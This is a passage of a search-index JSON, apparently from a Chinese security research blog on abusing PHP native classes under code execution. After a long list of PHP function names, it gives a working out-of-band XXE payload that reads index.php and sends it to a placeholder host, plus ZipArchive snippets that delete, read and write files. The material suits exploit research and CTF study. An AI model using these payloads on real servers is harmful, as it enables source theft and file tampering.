date_default_timezone_set, date_default_timezone_get, date_sunrise, date_sunset, date_sun_info, libxml_set_streams_context, libxml_use_internal_errors, libxml_get_last_error, libxml_clear_errors, libxml_get_errors, libxml_disable_entity_loader, libxml_set_external_entity_loader, openssl_get_cert_locations, openssl_spki_new, openssl_spki_verify, openssl_spki_export, openssl_spki_export_challenge, openssl_pkey_free, openssl_pkey_new, openssl_pkey_export, openssl_pkey_export_to_file, openssl_pkey_get_private, openssl_pkey_get_public, openssl_pkey_get_details, openssl_free_key, openssl_get_privatekey, openssl_get_publickey, openssl_x509_read, openssl_x509_free, openssl_x509_parse, openssl_x509_checkpurpose, openssl_x509_check_private_key, openssl_x509_verify, openssl_x509_export, openssl_x509_fingerprint, openssl_x509_export_to_file, openssl_pkcs12_export, openssl_pkcs12_export_to_file, openssl_pkcs12_read, openssl_csr_new, openssl_csr_export, openssl_csr_export_to_file, openssl_csr_sign, openssl_csr_get_subject, openssl_csr_get_public_key, openssl_digest, openssl_encrypt, openssl_decrypt, openssl_cipher_iv_length, openssl_sign, openssl_verify, openssl_seal, openssl_open, openssl_pbkdf2, openssl_pkcs7_verify, openssl_pkcs7_decrypt, openssl_pkcs7_sign, openssl_pkcs7_encrypt, openssl_pkcs7_read, openssl_private_encrypt, openssl_private_decrypt, openssl_public_encrypt, openssl_public_decrypt, openssl_get_md_methods, openssl_get_cipher_methods, openssl_get_curve_names, openssl_dh_compute_key, openssl_pkey_derive, openssl_random_pseudo_bytes, openssl_error_string, preg_match_all, preg_replace, preg_replace_callback, preg_replace_callback_array, preg_filter, preg_split, preg_quote, preg_grep, preg_last_error, readgzfile, gzrewind, gzclose, gzeof, gzgetc, gzgets, gzgetss, gzread, gzopen, gzpassthru, gzseek, gztell, gzwrite, gzputs, gzfile, gzcompress, gzuncompress, gzdeflate, gzinflate, gzencode, gzdecode, zlib_encode, zlib_decode, zlib_get_coding_type, deflate_init, deflate_add, inflate_init, inflate_add, inflate_get_status, inflate_get_read_len, ob_gzhandler, filter_input, filter_var, filter_input_array, filter_var_array, filter_list, filter_has_var, filter_id, hash, hash_file, hash_hmac, hash_hmac_file, hash_init, hash_update, hash_update_stream, hash_update_file, hash_final, hash_copy, hash_algos, hash_hmac_algos, hash_pbkdf2, hash_equals, hash_hkdf, mhash_keygen_s2k, mhash_get_block_size, mhash_get_hash_name, mhash_count, mhash, session_name, session_module_name, session_save_path, session_id, session_create_id, session_regenerate_id, session_decode, session_encode, session_start, session_destroy, session_unset, session_gc, session_set_save_handler, session_cache_limiter, session_cache_expire, session_set_cookie_params, session_get_cookie_params, session_write_close, session_abort, session_reset, session_status, session_register_shutdown, session_commit, sodium_crypto_aead_aes256gcm_is_available, sodium_crypto_aead_aes256gcm_decrypt, sodium_crypto_aead_aes256gcm_encrypt, sodium_crypto_aead_aes256gcm_keygen, sodium_crypto_aead_chacha20poly1305_decrypt, sodium_crypto_aead_chacha20poly1305_encrypt, sodium_crypto_aead_chacha20poly1305_keygen, sodium_crypto_aead_chacha20poly1305_ietf_decrypt, sodium_crypto_aead_chacha20poly1305_ietf_encrypt, sodium_crypto_aead_chacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_decrypt, sodium_crypto_aead_xchacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_encrypt, sodium_crypto_auth, sodium_crypto_auth_keygen, sodium_crypto_auth_verify, sodium_crypto_box, sodium_crypto_box_keypair, sodium_crypto_box_seed_keypair, sodium_crypto_box_keypair_from_secretkey_and_publickey, sodium_crypto_box_open, sodium_crypto_box_publickey, sodium_crypto_box_publickey_from_secretkey, sodium_crypto_box_seal, sodium_crypto_box_seal_open, sodium_crypto_box_secretkey, sodium_crypto_kx_keypair, sodium_crypto_kx_publickey, sodium_crypto_kx_secretkey, sodium_crypto_kx_seed_keypair, sodium_crypto_kx_client_session_keys, sodium_crypto_kx_server_session_keys, sodium_crypto_generichash, sodium_crypto_generichash_keygen, sodium_crypto_generichash_init, sodium_crypto_generichash_update, sodium_crypto_generichash_final, sodium_crypto_kdf_derive_from_key, sodium_crypto_kdf_keygen, sodium_crypto_pwhash, sodium_crypto_pwhash_str, sodium_crypto_pwhash_str_verify, sodium_crypto_pwhash_str_needs_rehash, sodium_crypto_pwhash_scryptsalsa208sha256, sodium_crypto_pwhash_scryptsalsa208sha256_str, sodium_crypto_pwhash_scryptsalsa208sha256_str_verify, sodium_crypto_scalarmult, sodium_crypto_secretbox, sodium_crypto_secretbox_keygen, sodium_crypto_secretbox_open, sodium_crypto_secretstream_xchacha20poly1305_keygen, sodium_crypto_secretstream_xchacha20poly1305_init_push, sodium_crypto_secretstream_xchacha20poly1305_push, sodium_crypto_secretstream_xchacha20poly1305_init_pull, sodium_crypto_secretstream_xchacha20poly1305_pull, sodium_crypto_secretstream_xchacha20poly1305_rekey, sodium_crypto_shorthash, sodium_crypto_shorthash_keygen, sodium_crypto_sign, sodium_crypto_sign_detached, sodium_crypto_sign_ed25519_pk_to_curve25519, sodium_crypto_sign_ed25519_sk_to_curve25519, sodium_crypto_sign_keypair, sodium_crypto_sign_keypair_from_secretkey_and_publickey, sodium_crypto_sign_open, sodium_crypto_sign_publickey, sodium_crypto_sign_secretkey, sodium_crypto_sign_publickey_from_secretkey, sodium_crypto_sign_seed_keypair, sodium_crypto_sign_verify_detached, sodium_crypto_stream, sodium_crypto_stream_keygen, sodium_crypto_stream_xor, sodium_add, sodium_compare, sodium_increment, sodium_memcmp, sodium_memzero, sodium_pad, sodium_unpad, sodium_bin2hex, sodium_hex2bin, sodium_bin2base64, sodium_base642bin, sodium_crypto_scalarmult_base, spl_classes, spl_autoload, spl_autoload_extensions, spl_autoload_register, spl_autoload_unregister, spl_autoload_functions, spl_autoload_call, class_parents, class_implements, class_uses, spl_object_hash, spl_object_id, iterator_to_array, iterator_count, iterator_apply, constant, bin2hex, hex2bin, sleep, usleep, time_nanosleep, time_sleep_until, strptime, flush, wordwrap, htmlspecialchars, htmlentities, html_entity_decode, htmlspecialchars_decode, get_html_translation_table, sha1, sha1_file, md5, md5_file, crc32, iptcparse, iptcembed, getimagesize, getimagesizefromstring, image_type_to_mime_type, image_type_to_extension, phpversion, phpcredits, php_sapi_name, php_uname, php_ini_scanned_files, php_ini_loaded_file, strnatcmp, strnatcasecmp, substr_count, strspn, strcspn, strtok, strtoupper, ini_set, strtolower, strpos, stripos, strrpos, strripos, strrev, hebrev, hebrevc, nl2br, basename, dirname, pathinfo, stripslashes, stripcslashes, stristr, strrchr, str_shuffle, str_word_count, str_split, strpbrk, substr_compare, utf8_encode, utf8_decode, strcoll, money_format, substr, substr_replace, quotemeta, ucfirst, lcfirst, ucwords, strtr, addslashes, addcslashes, rtrim, str_replace, str_ireplace, str_repeat, count_chars, chunk_split, trim, ltrim, strip_tags, similar_text, explode, implode, join, setlocale, localeconv, nl_langinfo, soundex, levenshtein, chr, ord, parse_str, str_getcsv, str_pad, chop, strchr, sprintf, printf, vprintf, vsprintf, fprintf, vfprintf, sscanf, fscanf, parse_url, urlencode, urldecode, rawurlencode, rawurldecode, http_build_query, readlink, linkinfo, symlink, link, unlink, exec, system, escapeshellcmd, passthru, shell_exec, proc_open, proc_close, proc_terminate, proc_get_status, proc_nice, rand, srand, getrandmax, mt_rand, mt_srand, mt_getrandmax, random_bytes, random_int, getservbyname, getservbyport, getprotobyname, getprotobynumber, getmyuid, getmygid, getmypid, getmyinode, getlastmod, base64_decode, base64_encode, password_hash, password_get_info, password_needs_rehash, password_verify, password_algos, convert_uuencode, convert_uudecode, abs, ceil, floor, round, sin, cos, tan, asin, acos, atan, atanh, atan2, sinh, cosh, tanh, asinh, acosh, expm1, log1p, pi, is_finite, is_nan, is_infinite, pow, exp, log, log10, sqrt, hypot, deg2rad, rad2deg, bindec, hexdec, octdec, decbin, decoct, dechex, base_convert, number_format, fmod, intdiv, inet_ntop, inet_pton, ip2long, long2ip, getenv, getopt, sys_getloadavg, microtime, gettimeofday, getrusage, hrtime, uniqid, quoted_printable_decode, quoted_printable_encode, convert_cyr_string, get_current_user, set_time_limit, header_register_callback, get_cfg_var, get_magic_quotes_gpc, get_magic_quotes_runtime, error_get_last, error_clear_last, call_user_func, call_user_func_array, forward_static_call, forward_static_call_array, serialize, unserialize, var_dump, var_export, debug_zval_dump, print_r, memory_get_usage, memory_get_peak_usage, register_shutdown_function, register_tick_function, unregister_tick_function, highlight_file, highlight_string, php_strip_whitespace, ini_get, ini_get_all, ini_alter, ini_restore, get_include_path, set_include_path, restore_include_path, setcookie, setrawcookie, header, header_remove, headers_sent, headers_list, http_response_code, connection_aborted, connection_status, ignore_user_abort, parse_ini_file, parse_ini_string, is_uploaded_file, move_uploaded_file, gethostbyaddr, gethostbyname, gethostbynamel, gethostname, net_get_interfaces, dns_check_record, checkdnsrr, dns_get_mx, getmxrr, dns_get_record, intval, floatval, doubleval, strval, boolval, gettype, settype, is_null, is_resource, is_bool, is_int, is_float, is_integer, is_long, is_double, is_real, is_numeric, is_string, is_array, is_object, is_scalar, is_callable, is_iterable, is_countable, pclose, popen, readfile, rewind, rmdir, umask, fclose, feof, fgetc, fgets, fgetss, fread, fopen, fpassthru, ftruncate, fstat, fseek, ftell, fflush, fwrite, fputs, mkdir, rename, copy, tempnam, tmpfile, file, file_get_contents, file_put_contents, stream_select, stream_context_create, stream_context_set_params, stream_context_get_params, stream_context_set_option, stream_context_get_options, stream_context_get_default, stream_context_set_default, stream_filter_prepend, stream_filter_append, stream_filter_remove, stream_socket_client, stream_socket_server, stream_socket_accept, stream_socket_get_name, stream_socket_recvfrom, stream_socket_sendto, stream_socket_enable_crypto, stream_socket_shutdown, stream_socket_pair, stream_copy_to_stream, stream_get_contents, stream_supports_lock, stream_isatty, fgetcsv, fputcsv, flock, get_meta_tags, stream_set_read_buffer, stream_set_write_buffer, set_file_buffer, stream_set_chunk_size, stream_set_blocking, socket_set_blocking, stream_get_meta_data, stream_get_line, stream_wrapper_register, stream_register_wrapper, stream_wrapper_unregister, stream_wrapper_restore, stream_get_wrappers, stream_get_transports, stream_resolve_include_path, stream_is_local, get_headers, stream_set_timeout, socket_set_timeout, socket_get_status, realpath, fnmatch, fsockopen, pfsockopen, pack, unpack, get_browser, crypt, opendir, closedir, chdir, getcwd, rewinddir, readdir, dir, scandir, glob, fileatime, filectime, filegroup, fileinode, filemtime, fileowner, fileperms, filesize, filetype, file_exists, is_writable, is_writeable, is_readable, is_executable, is_file, is_dir, is_link, stat, lstat, chown, chgrp, lchown, lchgrp, chmod, touch, clearstatcache, disk_total_space, disk_free_space, diskfreespace, realpath_cache_size, realpath_cache_get, ezmlm_hash, openlog, syslog, closelog, lcg_value, metaphone, ob_start, ob_flush, ob_clean, ob_end_flush, ob_end_clean, ob_get_flush, ob_get_clean, ob_get_length, ob_get_level, ob_get_status, ob_get_contents, ob_implicit_flush, ob_list_handlers, ksort, krsort, natsort, natcasesort, asort, arsort, sort, rsort, usort, uasort, uksort, shuffle, array_walk, array_walk_recursive, count, end, prev, next, reset, current, key, min, max, in_array, array_search, extract, compact, array_fill, array_fill_keys, range, array_multisort, array_push, array_pop, array_shift, array_unshift, array_splice, array_slice, array_merge, array_merge_recursive, array_replace, array_replace_recursive, array_keys, array_key_first, array_key_last, array_values, array_count_values, array_column, array_reverse, array_reduce, array_pad, array_flip, array_change_key_case, array_rand, array_unique, array_intersect, array_intersect_key, array_intersect_ukey, array_uintersect, array_intersect_assoc, array_uintersect_assoc, array_intersect_uassoc, array_uintersect_uassoc, array_diff, array_diff_key, array_diff_ukey, array_udiff, array_diff_assoc, array_udiff_assoc, array_diff_uassoc, array_udiff_uassoc, array_sum, array_product, array_filter, array_map, array_chunk, array_combine, array_key_exists, pos, sizeof, key_exists, assert, assert_options, version_compare, ftok, str_rot13, stream_get_filters, stream_filter_register, stream_bucket_make_writeable, stream_bucket_prepend, stream_bucket_append, stream_bucket_new, output_add_rewrite_var, output_reset_rewrite_vars, sys_get_temp_dir, apache_lookup_uri, virtual, apache_request_headers, apache_response_headers, apache_getenv, apache_note, apache_get_version, apache_get_modules, getallheaders, xxhash32, xxhash64, pdo_drivers, xml_parser_create, xml_parser_create_ns, xml_set_object, xml_set_element_handler, xml_set_character_data_handler, xml_set_processing_instruction_handler, xml_set_default_handler, xml_set_unparsed_entity_decl_handler, xml_set_notation_decl_handler, xml_set_external_entity_ref_handler, xml_set_start_namespace_decl_handler, xml_set_end_namespace_decl_handler, xml_parse, xml_parse_into_struct, xml_get_error_code, xml_error_string, xml_get_current_line_number, xml_get_current_column_number, xml_get_current_byte_index, xml_parser_free, xml_parser_set_option, xml_parser_get_option, jdtogregorian, gregoriantojd, jdtojulian, juliantojd, jdtojewish, jewishtojd, jdtofrench, frenchtojd, jddayofweek, jdmonthname, easter_date, easter_days, unixtojd, jdtounix, cal_to_jd, cal_from_jd, cal_days_in_month, cal_info, ctype_alnum, ctype_alpha, ctype_cntrl, ctype_digit, ctype_lower, ctype_graph, ctype_print, ctype_punct, ctype_space, ctype_upper, ctype_xdigit, dom_import_simplexml, exif_read_data, read_exif_data, exif_tagname, exif_thumbnail, exif_imagetype, finfo_open, finfo_close, finfo_set_flags, finfo_file, finfo_buffer, mime_content_type, ftp_connect, ftp_ssl_connect, ftp_login, ftp_pwd, ftp_cdup, ftp_chdir, ftp_exec, ftp_raw, ftp_mkdir, ftp_rmdir, ftp_chmod, ftp_alloc, ftp_nlist, ftp_rawlist, ftp_mlsd, ftp_systype, ftp_pasv, ftp_get, ftp_fget, ftp_put, ftp_append, ftp_fput, ftp_size, ftp_mdtm, ftp_rename, ftp_delete, ftp_site, ftp_close, ftp_set_option, ftp_get_option, ftp_nb_fget, ftp_nb_get, ftp_nb_continue, ftp_nb_put, ftp_nb_fput, ftp_quit, gd_info, imagearc, imageellipse, imagechar, imagecharup, imagecolorat, imagecolorallocate, imagepalettecopy, imagecreatefromstring, imagecolorclosest, imagecolorclosesthwb, imagecolordeallocate, imagecolorresolve, imagecolorexact, imagecolorset, imagecolortransparent, imagecolorstotal, imagecolorsforindex, imagecopy, imagecopymerge, imagecopymergegray, imagecopyresized, imagecreate, imagecreatetruecolor, imageistruecolor, imagetruecolortopalette, imagepalettetotruecolor, imagesetthickness, imagefilledarc, imagefilledellipse, imagealphablending, imagesavealpha, imagecolorallocatealpha, imagecolorresolvealpha, imagecolorclosestalpha, imagecolorexactalpha, imagecopyresampled, imagerotate, imageflip, imageantialias, imagecrop, imagecropauto, imagescale, imageaffine, imageaffinematrixconcat, imageaffinematrixget, imagesetinterpolation, imagesettile, imagesetbrush, imagesetstyle, imagecreatefrompng, imagecreatefromwebp, imagecreatefromgif, imagecreatefromjpeg, imagecreatefromwbmp, imagecreatefromxbm, imagecreatefromxpm, imagecreatefromgd, imagecreatefromgd2, imagecreatefromgd2part, imagecreatefrombmp, imagecreatefromtga, imagepng, imagewebp, imagegif, imagejpeg, imagewbmp, imagegd, imagegd2, imagebmp, imagedestroy, imagegammacorrect, imagefill, imagefilledpolygon, imagefilledrectangle, imagefilltoborder, imagefontwidth, imagefontheight, imageinterlace, imageline, imageloadfont, imagepolygon, imageopenpolygon, imagerectangle, imagesetpixel, imagestring, imagestringup, imagesx, imagesy, imagesetclip, imagegetclip, imagedashedline, imagettfbbox, imagettftext, imageftbbox, imagefttext, imagetypes, jpeg2wbmp, png2wbmp, image2wbmp, imagelayereffect, imagexbm, imagecolormatch, imagefilter, imageconvolution, imageresolution, textdomain, gettext, _, dgettext, dcgettext, bindtextdomain, ngettext, dngettext, dcngettext, bind_textdomain_codeset, gmp_init, gmp_import, gmp_export, gmp_intval, gmp_strval, gmp_add, gmp_sub, gmp_mul, gmp_div_qr, gmp_div_q, gmp_div_r, gmp_div, gmp_mod, gmp_divexact, gmp_neg, gmp_abs, gmp_fact, gmp_sqrt, gmp_sqrtrem, gmp_root, gmp_rootrem, gmp_pow, gmp_powm, gmp_perfect_square, gmp_perfect_power, gmp_prob_prime, gmp_gcd, gmp_gcdext, gmp_lcm, gmp_invert, gmp_jacobi, gmp_legendre, gmp_kronecker, gmp_cmp, gmp_sign, gmp_random, gmp_random_seed, gmp_random_bits, gmp_random_range, gmp_and, gmp_or, gmp_com, gmp_xor, gmp_setbit, gmp_clrbit, gmp_testbit, gmp_scan0, gmp_scan1, gmp_popcount, gmp_hamdist, gmp_nextprime, gmp_binomial, iconv, iconv_get_encoding, iconv_set_encoding, iconv_strlen, iconv_substr, iconv_strpos, iconv_strrpos, iconv_mime_encode, iconv_mime_decode, iconv_mime_decode_headers, json_encode, json_decode, json_last_error, json_last_error_msg, mb_convert_case, mb_strtoupper, mb_strtolower, mb_language, mb_internal_encoding, mb_http_input, mb_http_output, mb_detect_order, mb_substitute_character, mb_parse_str, mb_output_handler, mb_preferred_mime_name, mb_str_split, mb_strlen, mb_strpos, mb_strrpos, mb_stripos, mb_strripos, mb_strstr, mb_strrchr, mb_stristr, mb_strrichr, mb_substr_count, mb_substr, mb_strcut, mb_strwidth, mb_strimwidth, mb_convert_encoding, mb_detect_encoding, mb_list_encodings, mb_encoding_aliases, mb_convert_kana, mb_encode_mimeheader, mb_decode_mimeheader, mb_convert_variables, mb_encode_numericentity, mb_decode_numericentity, mb_send_mail, mb_get_info, mb_check_encoding, mb_ord, mb_chr, mb_scrub, mb_regex_encoding, mb_regex_set_options, mb_ereg, mb_eregi, mb_ereg_replace, mb_eregi_replace, mb_ereg_replace_callback, mb_split, mb_ereg_match, mb_ereg_search, mb_ereg_search_pos, mb_ereg_search_regs, mb_ereg_search_init, mb_ereg_search_getregs, mb_ereg_search_getpos, mb_ereg_search_setpos, mbregex_encoding, mbereg, mberegi, mbereg_replace, mberegi_replace, mbsplit, mbereg_match, mbereg_search, mbereg_search_pos, mbereg_search_regs, mbereg_search_init, mbereg_search_getregs, mbereg_search_getpos, mbereg_search_setpos, mysqli_affected_rows, mysqli_autocommit, mysqli_begin_transaction, mysqli_change_user, mysqli_character_set_name, mysqli_close, mysqli_commit, mysqli_connect, mysqli_connect_errno, mysqli_connect_error, mysqli_data_seek, mysqli_dump_debug_info, mysqli_debug, mysqli_errno, mysqli_error, mysqli_error_list, mysqli_stmt_execute, mysqli_execute, mysqli_fetch_field, mysqli_fetch_fields, mysqli_fetch_field_direct, mysqli_fetch_lengths, mysqli_fetch_all, mysqli_fetch_array, mysqli_fetch_assoc, mysqli_fetch_object, mysqli_fetch_row, mysqli_field_count, mysqli_field_seek, mysqli_field_tell, mysqli_free_result, mysqli_get_connection_stats, mysqli_get_client_stats, mysqli_get_charset, mysqli_get_client_info, mysqli_get_client_version, mysqli_get_links_stats, mysqli_get_host_info, mysqli_get_proto_info, mysqli_get_server_info, mysqli_get_server_version, mysqli_get_warnings, mysqli_init, mysqli_info, mysqli_insert_id, mysqli_kill, mysqli_more_results, mysqli_multi_query, mysqli_next_result, mysqli_num_fields, mysqli_num_rows, mysqli_options, mysqli_ping, mysqli_poll, mysqli_prepare, mysqli_report, mysqli_query, mysqli_real_connect, mysqli_real_escape_string, mysqli_real_query, mysqli_reap_async_query, mysqli_release_savepoint, mysqli_rollback, mysqli_savepoint, mysqli_select_db, mysqli_set_charset, mysqli_stmt_affected_rows, mysqli_stmt_attr_get, mysqli_stmt_attr_set, mysqli_stmt_bind_param, mysqli_stmt_bind_result, mysqli_stmt_close, mysqli_stmt_data_seek, mysqli_stmt_errno, mysqli_stmt_error, mysqli_stmt_error_list, mysqli_stmt_fetch, mysqli_stmt_field_count, mysqli_stmt_free_result, mysqli_stmt_get_result, mysqli_stmt_get_warnings, mysqli_stmt_init, mysqli_stmt_insert_id, mysqli_stmt_more_results, mysqli_stmt_next_result, mysqli_stmt_num_rows, mysqli_stmt_param_count, mysqli_stmt_prepare, mysqli_stmt_reset, mysqli_stmt_result_metadata, mysqli_stmt_send_long_data, mysqli_stmt_store_result, mysqli_stmt_sqlstate, mysqli_sqlstate, mysqli_ssl_set, mysqli_stat, mysqli_store_result, mysqli_thread_id, mysqli_thread_safe, mysqli_use_result, mysqli_warning_count, mysqli_refresh, mysqli_escape_string, mysqli_set_opt, posix_kill, posix_getpid, posix_getppid, posix_getuid, posix_setuid, posix_geteuid, posix_seteuid, posix_getgid, posix_setgid, posix_getegid, posix_setegid, posix_getgroups, posix_getlogin, posix_getpgrp, posix_setsid, posix_setpgid, posix_getpgid, posix_getsid, posix_uname, posix_times, posix_ctermid, posix_ttyname, posix_isatty, posix_getcwd, posix_mkfifo, posix_mknod, posix_access, posix_getgrnam, posix_getgrgid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_setrlimit, posix_get_last_error, posix_errno, posix_strerror, posix_initgroups, readline, readline_info, readline_add_history, readline_clear_history, readline_list_history, readline_read_history, readline_write_history, readline_completion_function, readline_callback_handler_install, readline_callback_read_char, readline_callback_handler_remove, readline_redisplay, readline_on_new_line, shmop_open, shmop_read, shmop_close, shmop_size, shmop_write, shmop_delete, simplexml_load_file, simplexml_load_string, simplexml_import_dom, socket_select, socket_create, socket_create_listen, socket_create_pair, socket_accept, socket_set_nonblock, socket_set_block, socket_listen, socket_close, socket_write, socket_read, socket_getsockname, socket_getpeername, socket_connect, socket_strerror, socket_bind, socket_recv, socket_send, socket_recvfrom, socket_sendto, socket_get_option, socket_set_option, socket_shutdown, socket_last_error, socket_clear_error, socket_import_stream, socket_export_stream, socket_sendmsg, socket_recvmsg, socket_cmsg_space, socket_addrinfo_lookup, socket_addrinfo_connect, socket_addrinfo_bind, socket_addrinfo_explain, socket_getopt, socket_setopt, msg_get_queue, msg_send, msg_receive, msg_remove_queue, msg_stat_queue, msg_set_queue, msg_queue_exists, sem_get, sem_acquire, sem_release, sem_remove, shm_attach, shm_remove, shm_detach, shm_put_var, shm_has_var, shm_get_var, shm_remove_var, token_get_all, token_name, xmlwriter_open_uri, xmlwriter_open_memory, xmlwriter_set_indent, xmlwriter_set_indent_string, xmlwriter_start_comment, xmlwriter_end_comment, xmlwriter_start_attribute, xmlwriter_end_attribute, xmlwriter_write_attribute, xmlwriter_start_attribute_ns, xmlwriter_write_attribute_ns, xmlwriter_start_element, xmlwriter_end_element, xmlwriter_full_end_element, xmlwriter_start_element_ns, xmlwriter_write_element, xmlwriter_write_element_ns, xmlwriter_start_pi, xmlwriter_end_pi, xmlwriter_write_pi, xmlwriter_start_cdata, xmlwriter_end_cdata, xmlwriter_write_cdata, xmlwriter_text, xmlwriter_write_raw, xmlwriter_start_document, xmlwriter_end_document, xmlwriter_write_comment, xmlwriter_start_dtd, xmlwriter_end_dtd, xmlwriter_write_dtd, xmlwriter_start_dtd_element, xmlwriter_end_dtd_element, xmlwriter_write_dtd_element, xmlwriter_start_dtd_attlist, xmlwriter_end_dtd_attlist, xmlwriter_write_dtd_attlist, xmlwriter_start_dtd_entity, xmlwriter_end_dtd_entity, xmlwriter_write_dtd_entity, xmlwriter_output_memory, xmlwriter_flush, zip_open, zip_close, zip_read, zip_entry_open, zip_entry_close, zip_entry_read, zip_entry_filesize, zip_entry_name, zip_entry_compressedsize, zip_entry_compressionmethod, opcache_reset, opcache_invalidate, opcache_compile_file, opcache_is_script_cached, opcache_get_configuration, opcache_get_status, ## SimpleXMLElement \u5229\u7528\u7248\u672c: (PHP 5, PHP 7) \u6211\u4eec\u77e5\u9053\u53ef\u4ee5\u4f7f\u7528xxe\u6765\u8bfb\u53d6\u6587\u4ef6\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u6784\u9020\u4e00\u4e2axxe\u6f0f\u6d1e\u6765\u8bfb\u53d6\u6587\u4ef6\u5462\uff1f\u7b54\u6848\u662f\u80af\u5b9a\u7684\uff0c\u6211\u4eec\u6765\u770b\u4e0b\u5b98\u65b9\u6587\u6863: \u53ef\u4ee5\u770b\u5230\u5f53\u6211\u4eec\u8bbe\u7f6e\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e3atrue\u65f6\uff0c\u53ef\u4ee5\u4ece\u8fdc\u7a0b\u52a0\u8f7dxml\u6587\u6863\uff0c\u90a3\u4e48\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8be5\u5982\u4f55\u8bbe\u7f6e\u5462\uff1f\u6211\u4eec\u67e5\u770bphp\u7684\u9884\u5b9a\u4e49\u5e38\u91cf \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u5b58\u5728\u8b66\u544a\uff0c\u5f53\u6211\u4eec\u8bbe\u7f6e\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a LIBXML_NOENT \u65f6\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4xxe\u653b\u51fb\uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u60f3\u8981\u7684\u3002\u624b\u52a8\u8f93\u51fa\u4e0b\u8be5\u503c\uff0c\u4e3a2\uff0c\u6240\u4ee5\u6211\u4eec\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u8be5\u53c2\u6570\u4e3a2:","title":"\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e0b\u7684php\u539f\u751f\u7c7b\u5229\u7528"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u8bfb\u6587\u4ef6poc","text":"evil.xml <?xml version=\"1.0\"?> <!DOCTYPE ANY[ <!ENTITY % remote SYSTEM \"http://xxx.xxx.xxx.xxx/send.xml\"> %remote; %all; %send; ]> send.xml <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\"> <!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/send.php?file=%file;'> \"> send.php <?php file_put_contents ( \"result.txt\" , $_GET [ 'file' ]) ; ?> \u6076\u610f\u4ee3\u7801 $x=new SimpleXMLElement(\"http://xxx.xxx.xxx.xxx/evil.xml\",2,true); \u5f53\u7136\u6211\u4eec\u4e0d\u6b62\u53ef\u4ee5\u8bfb\u6587\u4ef6\uff0cxxe\u80fd\u5e72\u7684\u4e8b\u6211\u4eec\u4e5f\u80fd\u5e72","title":"\u8bfb\u6587\u4ef6poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#ziparchive","text":"\u5229\u7528\u7248\u672c: (PHP 5 >= 5.2.0, PHP 7, PECL zip >= 1.1.0) \u8fd9\u4e2a\u7c7b\u662f\u5728php5.2.0\u4e4b\u540e\u5f15\u5165\u7684\uff0c\u6211\u4eec\u4e4b\u524d\u4f1a\u5728\u4e00\u4e9b\u539f\u751f\u7c7b\u5229\u7528\u4e2d\u89c1\u5230\u5b83\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u8fd9\u4e2a\u7c7b\u6765\u5220\u9664\u6587\u4ef6\uff0c\u8bfb\u53d6\u6587\u4ef6\u4ee5\u53ca\u6709\u635f\u5199\u6587\u4ef6\u3002","title":"ZipArchive"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u5220\u9664\u6587\u4ef6poc","text":"$a=new ZipArchive(); $a->open(\"file\", ZipArchive::OVERWRITE); // ZipArchive::CREATE\u4e5f\u53ef\u4ee5\u75288\u4ee3\u66ff","title":"\u5220\u9664\u6587\u4ef6poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u8bfb\u53d6\u6587\u4ef6poc","text":"$f = \"flag\"; $zip=new ZipArchive(); $zip->open(\"a.zip\", ZipArchive::CREATE); $zip->addFile($f); $zip->close(); $zip->open(\"a.zip\"); echo $zip->getFromName($f); $zip->close();","title":"\u8bfb\u53d6\u6587\u4ef6poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u6709\u635f\u5199\u6587\u4ef6poc","text":"\u7528\u5904\u4e0d\u5927 $f = \"flag\"; $zip=new ZipArchive(); $zip->open(\"a.zip\", ZipArchive::CREATE); $zip->setArchiveComment(\" <?php phpinfo (); ?> \"); $zip->addFromString(\"file\", \"\"); $zip->close(); //include 